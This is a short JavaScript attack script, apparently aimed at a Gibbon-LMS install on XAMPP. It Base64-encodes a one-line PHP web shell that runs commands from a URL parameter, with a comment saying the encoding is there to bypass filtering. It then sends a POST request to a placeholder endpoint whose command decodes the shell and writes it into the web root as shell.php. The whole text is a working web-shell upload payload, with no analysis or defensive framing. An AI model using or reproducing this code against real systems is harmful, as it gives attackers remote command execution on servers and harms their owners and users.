const phpCode = `<?php system($_GET['cmd']); ?>`;
const encodedPayload = btoa(phpCode); // Base64 encoding to bypass filtering

fetch("http://url/", {
    method: "POST",
    body: JSON.stringify({ command: `echo ${encodedPayload} | base64 -d > C:\\xampp\\htdocs\\Gibbon-LMS\\shell.php` }),
    headers: { "Content-Type": "application/json" }
})
.then(res => res.text())
.then(output => console.log("Upload Result:", output))
.catch(err => console.log("Error:", err));
